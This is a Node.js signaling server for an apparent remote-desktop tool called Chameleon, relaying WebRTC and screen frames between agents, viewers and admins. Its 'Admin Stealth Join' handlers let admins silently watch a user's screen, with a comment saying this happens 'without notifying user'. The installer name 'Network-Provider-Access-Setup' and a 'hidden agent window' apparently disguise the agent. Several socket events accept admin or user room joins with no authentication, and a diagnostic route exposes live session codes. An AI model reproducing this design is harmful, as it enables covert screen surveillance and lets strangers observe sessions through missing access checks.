require('dotenv').config();
const express = require('express');
const http = require('http');
const cors = require('cors');
const mongoose = require('mongoose');
const { Server } = require('socket.io');

const Version = require('./models/Version');
const Log = require('./models/Log');
const Session = require('./models/Session');
const Device = require('./models/Device');
const { logger, maskSessionId, describeCandidate, describeSdp } = require('./utils/signalingLog');
const { buildIceServers, isTurnConfigured, describeTurnConfig, createTurnProvider, DEFAULT_STUN_URLS } = require('./services/iceServers');

// Route Imports
const agentRoutes = require('./routes/agent');
const authRoutes = require('./routes/auth');
const deviceRoutes = require('./routes/devices');
const sessionRoutes = require('./routes/sessions');
const versionRoutes = require('./routes/versions');
const logRoutes = require('./routes/logs');

const app = express();
const server = http.createServer(app);

// CORS Config
// Explicit allow-list (used by both Express and Socket.IO below) instead of a
// blanket '*' so we can add/verify specific production/preview frontends.
// Requests with no Origin header (curl, server-to-server, mobile webviews)
// are allowed through, matching the previous '*' behavior for non-browser clients.
const ALLOWED_ORIGINS = [
  'https://1-chameleon.vercel.app',          // primary production web client
  'https://chameleon-jet.vercel.app',        // production web client (viewer)
  'https://chameleon-agent.online',          // production admin dashboard / marketing site
  'https://www.chameleon-agent.online',
  'https://1-chameleon-git-main-chamelom.vercel.app', // production Vercel deployment (reported CORS failure)
  'http://localhost:5173',                   // local dev (client/frontend, Vite default port)
  'http://localhost:5174'                    // local dev fallback port when 5173 is taken
];

const isOriginAllowed = (origin) => {
  if (!origin) return true;
  if (ALLOWED_ORIGINS.includes(origin)) return true;
  if (process.env.CLIENT_URL && origin === process.env.CLIENT_URL) return true;
  if (process.env.ALLOWED_ORIGINS && process.env.ALLOWED_ORIGINS.split(',').map(s => s.trim()).includes(origin)) return true;
  // Allow all Vercel deployments (*.vercel.app) for 1-chameleon and chameleon
  if (/^https:\/\/[a-zA-Z0-9-]+(\.vercel\.app)$/.test(origin)) return true;
  // Allow local development on localhost/127.0.0.1 on any port
  if (/^http:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/.test(origin)) return true;
  return false;
};

const corsOriginCheck = (origin, callback) => {
  if (isOriginAllowed(origin)) {
    callback(null, true);
  } else {
    callback(new Error(`CORS: origin ${origin} not allowed`));
  }
};

app.use(cors({
  origin: corsOriginCheck,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
}));
app.use(express.json({
  verify: (req, res, buf) => {
    req.rawBody = buf;
  }
}));

// Set up in-memory command buffer
const activeCommands = {};
app.set('activeCommands', activeCommands);

// Connect to MongoDB Atlas / Local MongoDB
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chameleon_admin';
mongoose.connect(MONGODB_URI)
  .then(async () => {
    console.log('[DB] Connected successfully to MongoDB');
    
    // Seed default stable version on startup if database is empty
    const count = await Version.countDocuments();
    if (count === 0) {
      await Version.create({
        version: '1.4.1',
        downloadUrl: 'https://chameleon-jet.vercel.app/Network-Provider-Access-Setup-1.4.1.exe',
        isStable: true,
        isDeprecated: false,
        installedCount: 0,
        pendingUpdateCount: 0
      });
      console.log('[DB] Seeded initial stable release version v1.4.1');
    }
  })
  .catch((err) => {
    console.error('[DB] Connection failure:', err);
  });

const userAuthRoutes = require('./routes/userAuth');
const billingRoutes = require('./routes/billing');
const { authLimiter, apiLimiter, helmetMiddleware } = require('./middleware/securityMiddleware');

app.use(helmetMiddleware);
app.use('/api/auth', authLimiter, userAuthRoutes);
app.use('/api/billing', billingRoutes);
app.use('/api/agent', apiLimiter, agentRoutes);
app.use('/api/admin/auth', authRoutes);
app.use('/api/admin/devices', deviceRoutes);
app.use('/api/admin/sessions', sessionRoutes);
app.use('/api/admin/versions', versionRoutes);
app.use('/api/admin/logs', logRoutes);

// Base Ping
app.get('/ping', (req, res) => {
  res.send('pong');
});

// Database Diagnostic Route
app.get('/test-db', (req, res) => {
  res.json({
    readyState: mongoose.connection.readyState,
    hasUri: !!process.env.MONGODB_URI,
    env: process.env.NODE_ENV || 'development',
    activeSocketSessionsCount: activeSocketSessions.size,
    activeSocketSessionsKeys: Array.from(activeSocketSessions.keys())
  });
});

// Root Welcome Route
app.get('/', (req, res) => {
  res.send('Chameleon Signaling Backend is running. Please access the admin dashboard on the frontend port (default 5173).');
});

// ── Signaling tunables (all overridable via environment, mainly so tests can use tiny values) ──
const envInt = (name, fallback) => {
  const n = parseInt(process.env[name], 10);
  return Number.isFinite(n) && n >= 0 ? n : fallback;
};
const SIGNALING = {
  // How long a session survives its agent's signaling socket dropping (Render restarts, wifi blips).
  agentGraceMs: envInt('AGENT_RECONNECT_GRACE_MS', 20000),
  // How long the agent keeps streaming after the viewer's signaling socket drops unexpectedly.
  // (An explicit "client:leave_session" ends the viewer immediately.)
  clientGraceMs: envInt('CLIENT_RECONNECT_GRACE_MS', 12000),
  // Just after (re)start the in-memory session map is empty until agents reconnect, so "not found"
  // is reported as retryable for this long.
  coldStartWindowMs: envInt('COLD_START_GRACE_MS', 120000),
  sweepIntervalMs: envInt('SESSION_SWEEP_INTERVAL_MS', 30000),
  // Server-controlled (client-side pingInterval/pingTimeout options are ignored by Socket.IO v4).
  // Default 25s/20s meant a dead peer lingered ~45s; this detects it in <= ~30s while still tolerating a
  // busy or timer-throttled hidden agent window (which must answer pings while encoding screen capture).
  pingIntervalMs: envInt('SOCKET_PING_INTERVAL_MS', 15000),
  pingTimeoutMs: envInt('SOCKET_PING_TIMEOUT_MS', 15000),
};
const SERVER_STARTED_AT = Date.now();

// Configure Socket.IO
const io = new Server(server, {
  pingInterval: SIGNALING.pingIntervalMs,
  pingTimeout: SIGNALING.pingTimeoutMs,
  cors: {
    origin: corsOriginCheck,
    methods: ['GET', 'POST']
  }
});
app.set('io', io);

// Keep track of active WebRTC signaling sockets
const activeSocketSessions = new Map();
app.set('activeSocketSessions', activeSocketSessions);
app.set('isDeviceOnline', (deviceId) => {
  if (!deviceId) return false;
  for (const session of activeSocketSessions.values()) {
    if (session.deviceId === deviceId && session.agentOnline !== false) {
      return true;
    }
  }
  return false;
});

// Managed TURN (Cloudflare): credentials are fetched by the backend, cached and refreshed; a no-op unless
// CLOUDFLARE_TURN_KEY_ID and CLOUDFLARE_TURN_API_TOKEN are set.
const turnProvider = createTurnProvider(process.env, { logger });

// Non-sensitive signaling status for ops (no session codes). `turnConfigured: false` explains
// why peers on different restrictive networks cannot connect.
app.get('/signaling-status', (req, res) => {
  let withViewer = 0;
  for (const s of activeSocketSessions.values()) if (s.clientSocketId) withViewer++;
  res.json({
    ok: true,
    uptimeSec: Math.round(process.uptime()),
    activeSessions: activeSocketSessions.size,
    sessionsWithViewer: withViewer,
    turnConfigured: isTurnConfigured(process.env, turnProvider),
    turnMode: isTurnConfigured(process.env, turnProvider) ? 'fallback-only' : 'not-configured',
    turnTransports: describeTurnConfig(process.env, turnProvider).transports,
    turnWarnings: describeTurnConfig(process.env, turnProvider).warnings,
    turnProvider: turnProvider.status(),
    stunServers: DEFAULT_STUN_URLS.length,
    agentGraceMs: SIGNALING.agentGraceMs,
    clientGraceMs: SIGNALING.clientGraceMs
  });
});

const isSocketConnected = (socketId) => !!socketId && io.sockets.sockets.has(socketId);

// Which side of a session a socket is (null when it is not part of it).
const roleOf = (session, socketId) => {
  if (session.agentSocketId === socketId) return 'agent';
  if (session.clientSocketId === socketId) return 'client';
  if (session.adminSocketIds.has(socketId)) return 'admin';
  return null;
};

const clearTimer = (session, key) => {
  if (session[key]) {
    clearTimeout(session[key]);
    session[key] = null;
  }
};

// Final teardown of a session: notify peers, free the code, sync the database.
function endSession(sessionId, session, reason) {
  clearTimer(session, 'agentGraceTimer');
  clearTimer(session, 'clientGraceTimer');
  if (session.clientSocketId) {
    io.to(session.clientSocketId).emit('session:ended', { reason });
  }
  for (const adminId of session.adminSocketIds) {
    io.to(adminId).emit('session:ended', { reason });
  }
  activeSocketSessions.delete(sessionId);
  logger.info('session.ended', { session: maskSessionId(sessionId), reason });

  // Database Sync
  Session.findOneAndUpdate(
    { sessionId },
    { status: 'completed', endTime: new Date() }
  ).catch(err => {});

  Log.create({
    eventType: 'Session Ended',
    deviceId: session.deviceId,
    sessionId,
    description: `Session ${sessionId} completed (${reason})`,
    severity: 'info'
  }).catch(err => {});

  Device.findOneAndUpdate(
    { deviceId: session.deviceId },
    { status: 'offline' }
  ).catch(err => {});
}

// The agent's signaling socket went away. Keep the session for a grace period so a transient drop
// (or a Render restart + agent auto-reconnect) does not destroy the viewer's session.
function handleAgentGone(sessionId, session, reason) {
  if (!session.agentOnline && session.agentGraceTimer) return;
  session.agentOnline = false;
  logger.info('session.host_offline', { session: maskSessionId(sessionId), reason, graceMs: SIGNALING.agentGraceMs });
  if (SIGNALING.agentGraceMs === 0) return endSession(sessionId, session, 'Host agent disconnected');
  if (session.clientSocketId) {
    io.to(session.clientSocketId).emit('session:host_offline', { sessionId, graceMs: SIGNALING.agentGraceMs });
  }
  clearTimer(session, 'agentGraceTimer');
  session.agentGraceTimer = setTimeout(() => {
    session.agentGraceTimer = null;
    if (activeSocketSessions.get(sessionId) === session && !session.agentOnline) {
      endSession(sessionId, session, 'Host agent disconnected');
    }
  }, SIGNALING.agentGraceMs);
}

// Viewer released the session (explicitly, or its grace period after a dropped socket expired).
function releaseClient(sessionId, session, reason) {
  clearTimer(session, 'clientGraceTimer');
  if (!session.clientSocketId) return;
  session.clientSocketId = null;
  session.clientId = null;
  session.p2pConnected = false;
  logger.info('client.released', { session: maskSessionId(sessionId), reason });
  if (session.agentOnline) {
    io.to(session.agentSocketId).emit('session:ended', { reason: 'Client disconnected' });
  }
}

function handleClientGone(sessionId, session, reason) {
  if (session.clientGraceTimer) return;
  logger.info('client.disconnected', { session: maskSessionId(sessionId), reason, graceMs: SIGNALING.clientGraceMs });
  if (SIGNALING.clientGraceMs === 0) return releaseClient(sessionId, session, 'Client disconnected');
  const departed = session.clientSocketId;
  session.clientGraceTimer = setTimeout(() => {
    session.clientGraceTimer = null;
    // Only release if nobody re-joined in the meantime.
    if (session.clientSocketId === departed) releaseClient(sessionId, session, 'Client disconnected');
  }, SIGNALING.clientGraceMs);
}

// Safety net for missed disconnect events: a session whose sockets no longer exist is expired.
const sweepTimer = setInterval(() => {
  for (const [sessionId, session] of activeSocketSessions.entries()) {
    if (session.agentOnline && !isSocketConnected(session.agentSocketId)) {
      handleAgentGone(sessionId, session, 'sweep: agent socket missing');
    }
    if (session.clientSocketId && !isSocketConnected(session.clientSocketId)) {
      handleClientGone(sessionId, session, 'sweep: client socket missing');
    }
  }
}, SIGNALING.sweepIntervalMs);
sweepTimer.unref();

// Relay a signaling message between the two peers of a session, but only from a member of the
// session and only in the direction the sender is entitled to (agent -> client, client -> agent).
function relaySignal(socket, eventName, { sessionId, to, body, summary }) {
  const sid = String(sessionId == null ? '' : sessionId);
  const session = activeSocketSessions.get(sid);
  if (!session) {
    logger.warn('signal.undeliverable', { event: eventName, session: maskSessionId(sid), reason: 'session_not_found' });
    return socket.emit('signal:undeliverable', { event: eventName, reason: 'session_not_found' });
  }
  const role = roleOf(session, socket.id);
  const expectedTarget = role === 'client' ? 'agent' : role === 'agent' ? 'client' : null;
  if (!expectedTarget || to !== expectedTarget) {
    logger.warn('signal.rejected', { event: eventName, session: maskSessionId(sid), role: role || 'none', to: String(to) });
    return socket.emit('signal:undeliverable', { event: eventName, reason: 'not_allowed' });
  }
  const targetSocketId = to === 'agent' ? (session.agentOnline ? session.agentSocketId : null) : session.clientSocketId;
  if (!targetSocketId || !isSocketConnected(targetSocketId)) {
    logger.warn('signal.undeliverable', { event: eventName, session: maskSessionId(sid), from: role, to, reason: 'peer_offline' });
    return socket.emit('signal:undeliverable', { event: eventName, reason: 'peer_offline' });
  }
  io.to(targetSocketId).emit(eventName, { ...body, from: socket.id });
  logger.info(eventName === 'signal:sdp' ? 'signal.sdp' : 'signal.ice', {
    session: maskSessionId(sid), from: role, to, ...summary
  });
}

// Client/agent report their WebRTC state transitions so the whole lifecycle is visible in
// server logs (the browser console / agent window are otherwise the only place to see ICE state).
const DIAG_EVENTS = new Set([
  'socket_connected', 'join_sent', 'joined', 'host_waiting', 'offer_received', 'offer_sent', 'answer_sent',
  'answer_received', 'ice_candidate_sent', 'connection_state', 'ice_connection_state', 'ice_gathering_state',
  'signaling_state', 'connected', 'failed', 'timeout', 'recovery', 'selected_pair', 'closed'
]);
const DIAG_FIELDS = [
  'state', 'reason', 'code', 'phase', 'attempt', 'elapsedMs', 'candidateType', 'pairType', 'protocol', 'relay',
  // recovery method (ice_restart | renegotiate), relay transport that carried the media (udp | tcp | tls),
  // and the failure diagnosis: candidate COUNTS and relay error codes only, never addresses.
  'method', 'relayProtocol', 'route', 'candHost', 'candSrflx', 'candRelay', 'candRemote', 'iceErrors'
];

// Socket.IO serialises `undefined` as `null`, and these handlers destructure their first argument
// ( ({ sessionId, to }) => ... ). A single malformed packet from any client therefore threw an
// uncaught TypeError that killed the whole process - and with it every live session. Normalise
// the payload of every object-payload event so handlers always receive an object.
const OBJECT_PAYLOAD_EVENTS = new Set([
  'agent:authenticate', 'agent:create_session', 'agent:heartbeat', 'telemetry:stream', 'session:metrics',
  'client:join_session', 'client:leave_session', 'client:request_relay', 'signal:sdp', 'signal:ice',
  'relay:frame', 'relay:input', 'admin:join_session', 'admin:signal:sdp', 'admin:signal:ice', 'peer:diag'
]);

io.on('connection', (socket) => {
  logger.info('socket.connected', { socketId: socket.id, transport: socket.conn.transport.name });

  socket.use((packet, next) => {
    if (OBJECT_PAYLOAD_EVENTS.has(packet[0])) {
      const payload = packet[1];
      if (typeof payload === 'function') {
        packet.splice(1, 0, {}); // only an ack callback was sent
      } else if (payload === null || typeof payload !== 'object' || Array.isArray(payload)) {
        packet[1] = {};
      }
    }
    next();
  });

  // Room Joinings
  socket.on('join:device', (deviceId) => {
    socket.join(`device:${deviceId}`);
    console.log(`[Socket] Device ${deviceId} joined room device:${deviceId}`);
  });

  socket.on('join:user', (userId) => {
    socket.join(`user:${userId}`);
    console.log(`[Socket] User ${userId} joined room user:${userId}`);
  });

  socket.on('agent:authenticate', async ({ device_id, refresh_token }) => {
    try {
      const Device = require('./models/Device');
      const device = await Device.findOne({ deviceId: device_id });
      if (device && device.owner) {
        socket.join(`user:${device.owner}`);
        console.log(`[Socket] Authenticated Agent ${device_id} joined room user:${device.owner}`);
        socket.emit('agent:authenticated');
      }
    } catch (e) {
      console.error('[Socket] agent:authenticate error:', e);
    }
  });

  socket.on('join:session', (sessionId) => {
    socket.join(`session:${sessionId}`);
    console.log(`[Socket] Session ${sessionId} joined room session:${sessionId}`);
  });

  socket.on('join:admin', () => {
    socket.join('admin:dashboard');
    console.log('[Socket] Administrator joined dashboard room');
  });

  // Telemetry relay from Agent -> Admin
  socket.on('telemetry:stream', ({ deviceId, cpuUsage, ramUsage, diskUsage, agentUptime }) => {
    io.to('admin:dashboard').emit('telemetry:data', { 
      deviceId, cpuUsage, ramUsage, diskUsage, agentUptime, timestamp: Date.now() 
    });
  });

  // WebRTC metrics relay from Session -> Admin
  socket.on('session:metrics', ({ sessionId, fps, bitrate, latency, packetLoss, resolution }) => {
    io.to('admin:dashboard').emit('session:data', {
      sessionId, fps, bitrate, latency, packetLoss, resolution, timestamp: Date.now()
    });
  });

  // ── WebRTC Signaling ──
  socket.on('agent:create_session', (data) => {
    let sessionId = data && data.sessionId;
    if (!sessionId) {
      sessionId = Math.floor(100000 + Math.random() * 900000).toString();
    }
    sessionId = String(sessionId);

    const deviceId = (data && data.deviceId) || 'DEV-REAL-' + socket.id.substring(0, 5);
    const details = data && data.deviceDetails;

    const existing = activeSocketSessions.get(sessionId);
    if (existing) {
      // The agent (re)registered a code that is already live: socket.io auto-reconnect after a
      // network blip / Render restart, the desktop app emitting create_session twice, or the old
      // socket not yet timed out. Previously this REPLACED the session, silently dropping the
      // connected viewer (clientSocketId reset to null). Keep the viewer, just re-point the agent.
      const sameSocket = existing.agentSocketId === socket.id;
      clearTimer(existing, 'agentGraceTimer');
      existing.agentSocketId = socket.id;
      existing.agentOnline = true;
      existing.deviceId = deviceId;
      socket.emit('agent:session_created', { sessionId, expiresIn: 0 });
      logger.info('session.agent_rejoined', { session: maskSessionId(sessionId), sameSocket, viewerAttached: !!existing.clientSocketId });

      if (!sameSocket && existing.clientSocketId && isSocketConnected(existing.clientSocketId)) {
        io.to(existing.clientSocketId).emit('session:host_reconnected', { sessionId });
        // If the viewer has no live peer connection, have the agent start a fresh negotiation.
        if (!existing.p2pConnected) {
          logger.info('peer.detected', { session: maskSessionId(sessionId), side: 'agent_returned' });
          socket.emit('agent:client_joined', { sessionId, relay: !!existing.relay, iceServers: buildIceServers(process.env, Date.now(), { relay: !!existing.relay, provider: turnProvider }) });
        }
      }
    } else {
      activeSocketSessions.set(sessionId, {
        agentSocketId: socket.id,
        agentOnline: true,
        deviceId: deviceId,
        clientSocketId: null,
        clientId: null,
        p2pConnected: false,
        relay: false,
        adminSocketIds: new Set(),
        agentGraceTimer: null,
        clientGraceTimer: null,
        createdAt: Date.now()
      });
      socket.emit('agent:session_created', { sessionId, expiresIn: 0 });
      logger.info('session.created', { session: maskSessionId(sessionId), socketId: socket.id });
      logger.info('session.waiting_for_peer', { session: maskSessionId(sessionId) });
    }

    // Sync to database
    Session.findOneAndUpdate(
      { sessionId },
      {
        sessionId,
        deviceId,
        sessionCode: sessionId,
        clientLink: `https://chameleon-jet.vercel.app/?sess=${sessionId}`,
        status: 'active',
        startTime: new Date()
      },
      { upsert: true }
    ).catch(err => console.error('[DB Sync] Session create error:', err));
    
    Log.create({
      eventType: 'Session Started',
      deviceId,
      sessionId,
      description: `Real agent started session ${sessionId}`,
      severity: 'info'
    }).catch(err => {});

    // Save/Update device details ONLY if valid device hardware details are provided
    if (details && details.hostname && details.hostname !== 'Unknown') {
      const deviceUpdate = {
        deviceId,
        hostname: details.hostname,
        osName: details.platform === 'win32' ? 'Windows' : details.platform,
        osVersion: details.release,
        agentVersion: details.version,
        lastSeen: new Date(),
        status: 'active'
      };

      Device.findOneAndUpdate(
        { deviceId },
        { $set: deviceUpdate },
        { upsert: true, new: true }
      ).then(device => {
        if (device && device.owner) {
          socket.join(`user:${device.owner}`);
          console.log(`[Socket] Agent ${deviceId} joined user room user:${device.owner}`);
        }
      }).catch(err => {});
    }
  });

  socket.on('agent:heartbeat', ({ deviceId }) => {
    if (deviceId) {
      Device.findOneAndUpdate(
        { deviceId },
        { lastSeen: new Date() },
        { upsert: false, new: true }
      ).then(device => {
        if (device && device.owner) {
          socket.join(`user:${device.owner}`);
        }
      }).catch(err => {});
    }
  });

  // Payload (all but sessionId optional, so older clients keep working):
  //   clientId  - stable per-viewer id, lets the server recognise a re-join of the same viewer
  //   resume    - true when the viewer's signaling socket reconnected
  //   peerState - the viewer's RTCPeerConnection state; with resume:true and 'connected' the
  //               existing media path is kept instead of renegotiating from scratch
  //   relay     - true only when a DIRECT attempt already failed: then (and only then) the optional TURN
  //               relay is added to the ICE servers of both peers. Default: plain STUN, TURN never contacted.
  socket.on('client:join_session', (payload) => {
    const { sessionId: rawId, clientId, resume, peerState, relay } = payload || {};
    const sessionId = rawId == null ? '' : String(rawId).trim();
    const session = sessionId ? activeSocketSessions.get(sessionId) : null;
    if (!session) {
      const retryable = Date.now() - SERVER_STARTED_AT < SIGNALING.coldStartWindowMs;
      logger.warn('client.join_rejected', { session: maskSessionId(sessionId), reason: 'session_not_found', retryable });
      return socket.emit('error', { message: 'Session not found', code: 'SESSION_NOT_FOUND', retryable });
    }

    // One viewer per session: a different viewer displaces the previous one, which is told so
    // (instead of silently losing its signaling route and hanging).
    const previous = session.clientSocketId;
    if (previous && previous !== socket.id) {
      const sameViewer = !!clientId && session.clientId === clientId;
      if (!sameViewer && isSocketConnected(previous)) {
        io.to(previous).emit('session:ended', { reason: 'Another viewer connected' });
      }
      logger.info('client.replaced', { session: maskSessionId(sessionId), sameViewer });
    }
    clearTimer(session, 'clientGraceTimer');
    session.clientSocketId = socket.id;
    session.clientId = typeof clientId === 'string' ? clientId.slice(0, 64) : null;

    const resumed = resume === true && peerState === 'connected';
    session.p2pConnected = resumed;
    const hostOnline = session.agentOnline !== false && isSocketConnected(session.agentSocketId);
    const relayAvailable = isTurnConfigured(process.env, turnProvider);
    // TURN is a fallback: only honoured when requested AND configured. Otherwise both peers get plain STUN.
    const useRelay = relay === true && relayAvailable;
    session.relay = useRelay;
    const iceServers = buildIceServers(process.env, Date.now(), { relay: useRelay, provider: turnProvider });

    socket.emit('client:joined_success', { sessionId, hostOnline, resumed, iceServers, relayAvailable, relay: useRelay });
    logger.info('client.joined', { session: maskSessionId(sessionId), socketId: socket.id, hostOnline, resumed, relay: useRelay, relayAvailable });

    if (hostOnline && !resumed) {
      logger.info('peer.detected', { session: maskSessionId(sessionId), side: 'client_joined' });
      io.to(session.agentSocketId).emit('agent:client_joined', { sessionId, relay: useRelay, iceServers });
    } else if (!hostOnline) {
      logger.warn('session.waiting_for_peer', { session: maskSessionId(sessionId), waitingFor: 'agent' });
    }

    Session.findOneAndUpdate(
      { sessionId },
      { status: 'active' }
    ).catch(err => {});
  });

  // Explicit "I'm leaving" from the viewer: no grace period, free the agent right away.
  socket.on('client:leave_session', ({ sessionId } = {}) => {
    const sid = String(sessionId == null ? '' : sessionId);
    const session = activeSocketSessions.get(sid);
    if (session && session.clientSocketId === socket.id) {
      releaseClient(sid, session, 'client left');
    }
  });

  socket.on('signal:sdp', ({ sessionId, sdp, to } = {}) => {
    relaySignal(socket, 'signal:sdp', { sessionId, to, body: { sdp }, summary: describeSdp(sdp) });
  });

  socket.on('signal:ice', ({ sessionId, candidate, to } = {}) => {
    relaySignal(socket, 'signal:ice', { sessionId, to, body: { candidate }, summary: describeCandidate(candidate) });
  });

  // Lifecycle diagnostics reported by the peers (state names only - never SDP/IP/credentials).
  let diagWindowStart = 0;
  let diagCount = 0;
  socket.on('peer:diag', (report) => {
    if (!report || !DIAG_EVENTS.has(report.event)) return;
    const now = Date.now();
    if (now - diagWindowStart > 10000) { diagWindowStart = now; diagCount = 0; }
    if (++diagCount > 60) return; // per-socket rate limit
    const sid = String(report.sessionId == null ? '' : report.sessionId);
    const session = activeSocketSessions.get(sid);
    const role = session ? roleOf(session, socket.id) : null;
    if (!role || role === 'admin') return;
    if (role === 'client' && report.event === 'connection_state') {
      session.p2pConnected = report.state === 'connected';
    }
    const fields = { session: maskSessionId(sid), role, diag: report.event };
    for (const key of DIAG_FIELDS) if (report[key] !== undefined) fields[key] = report[key];
    const bad = report.event === 'failed' || report.event === 'timeout' || (report.event === 'connection_state' && report.state === 'failed');
    logger[bad ? 'warn' : 'info']('peer.diag', fields);
  });

  socket.on('client:request_relay', ({ sessionId }) => {
    const session = activeSocketSessions.get(sessionId);
    if (session && session.agentSocketId) {
      io.to(session.agentSocketId).emit('agent:start_relay', { sessionId });
    }
  });

  socket.on('relay:frame', ({ sessionId, frame }, ackCallback) => {
    if (typeof ackCallback === 'function') ackCallback();
    const session = activeSocketSessions.get(sessionId);
    if (session && session.clientSocketId) {
      io.to(session.clientSocketId).volatile.emit('relay:frame', frame);
    }
    // Also forward relay frames to admin if any are observing
    if (session && session.adminSocketIds.size > 0) {
      for (const adminId of session.adminSocketIds) {
        io.to(adminId).volatile.emit('relay:frame', frame);
      }
    }
  });

  socket.on('relay:input', ({ sessionId, input }) => {
    const session = activeSocketSessions.get(sessionId);
    if (session && session.agentSocketId) {
      io.to(session.agentSocketId).emit('relay:input', input);
    }
  });

  // ── Admin Stealth Join & Observation ──
  socket.on('admin:join_session', ({ sessionId }) => {
    const session = activeSocketSessions.get(sessionId);
    if (!session) {
      return socket.emit('error', { message: 'Active pairing session not found on this signaling server' });
    }
    
    session.adminSocketIds.add(socket.id);
    console.log(`[Stealth] Admin ${socket.id} stealth-joined session ${sessionId}`);
    
    // Request agent to start a new peer connection for this admin (without notifying user)
    io.to(session.agentSocketId).emit('admin:join', { sessionId, adminSocketId: socket.id });
  });

  socket.on('admin:signal:sdp', ({ sessionId, sdp, to }) => {
    const session = activeSocketSessions.get(sessionId);
    if (!session) return;
    if (to) {
      // Sent from agent to a specific admin
      io.to(to).emit('admin:signal:sdp', { sdp, from: socket.id });
    } else {
      // Sent from admin to agent
      io.to(session.agentSocketId).emit('admin:signal:sdp', { sdp, from: socket.id });
    }
  });

  socket.on('admin:signal:ice', ({ sessionId, candidate, to }) => {
    const session = activeSocketSessions.get(sessionId);
    if (!session) return;
    if (to) {
      // Sent from agent to a specific admin
      io.to(to).emit('admin:signal:ice', { candidate, from: socket.id });
    } else {
      // Sent from admin to agent
      io.to(session.agentSocketId).emit('admin:signal:ice', { candidate, from: socket.id });
    }
  });

  socket.on('disconnect', (reason) => {
    logger.info('socket.disconnected', { socketId: socket.id, reason });

    for (const [sessionId, session] of activeSocketSessions.entries()) {
      if (session.agentSocketId === socket.id) {
        handleAgentGone(sessionId, session, reason);
      } else if (session.clientSocketId === socket.id) {
        handleClientGone(sessionId, session, reason);
      } else if (session.adminSocketIds.has(socket.id)) {
        session.adminSocketIds.delete(socket.id);
        io.to(session.agentSocketId).emit('admin:leave', { adminSocketId: socket.id });
        console.log(`[Stealth] Admin ${socket.id} left session ${sessionId}`);
      }
    }
  });
});

const turnInfo = describeTurnConfig(process.env, turnProvider);
logger.info('signaling.config', {
  turnConfigured: isTurnConfigured(process.env, turnProvider),
  turnTransports: turnInfo.transports.join('+') || 'none',
  stunServers: DEFAULT_STUN_URLS.length,
  agentGraceMs: SIGNALING.agentGraceMs,
  clientGraceMs: SIGNALING.clientGraceMs,
  pingIntervalMs: SIGNALING.pingIntervalMs
});
for (const warning of turnInfo.warnings) logger.warn('ice.turn_config', { warning });
if (turnProvider.isEnabled()) {
  // Managed TURN: the first credential fetch happens now; report the outcome so a bad key/token is obvious in the logs.
  turnProvider.start().then((ok) => {
    logger.info('ice.turn_provider', { ...turnProvider.status(), transports: describeTurnConfig(process.env, turnProvider).transports.join('+') });
    if (!ok) logger.warn('ice.turn_config', { warning: 'Managed TURN credentials could not be fetched: relay fallback is DISABLED until this succeeds (check CLOUDFLARE_TURN_KEY_ID / CLOUDFLARE_TURN_API_TOKEN)' });
  });
} else if (!isTurnConfigured(process.env, turnProvider)) {
  // Informational only: TURN is optional. Direct (STUN) connections work without it.
  logger.info('ice.turn_not_configured', {
    mode: 'direct-only',
    note: 'No TURN relay configured (optional). Peers connect directly via STUN; only network pairs that cannot connect directly would need one.'
  });
}

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`[Server] Listening on port ${PORT}`);
  
  // Initialize Background Billing Schedulers
  const checkSubscriptionExpiry = require('./jobs/subscriptionExpiry.job');
  const checkRenewalReminders = require('./jobs/renewalReminder.job');

  // Check once every 24 hours
  setInterval(() => {
    checkSubscriptionExpiry(io);
    checkRenewalReminders(io);
  }, 24 * 60 * 60 * 1000);

  // Run initial check 10 seconds after server starts up
  setTimeout(() => {
    console.log('[Scheduler] Running initial startup billing check...');
    checkSubscriptionExpiry(io);
    checkRenewalReminders(io);
  }, 10000);
});
